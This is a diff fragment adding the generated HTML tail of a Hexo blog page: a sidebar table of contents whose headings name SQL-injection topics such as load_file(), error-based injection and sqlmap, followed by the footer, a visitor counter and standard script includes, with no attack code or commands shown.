nav-level-4"><a class="nav-link" href="#ascii"><span class="nav-number">2.0.3.4.</span> <span class="nav-text">ascii()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep"><span class="nav-number">2.0.3.5.</span> <span class="nav-text">sleep()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.4.</span> <span class="nav-text">读写文件函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#load-file"><span class="nav-number">2.0.4.1.</span> <span class="nav-text">load_file()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#into-outfile"><span class="nav-number">2.0.4.2.</span> <span class="nav-text">into outfile</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.3.</span> <span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie"><span class="nav-number">2.3.1.</span> <span class="nav-text">cookie</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">关根</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>本站总访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
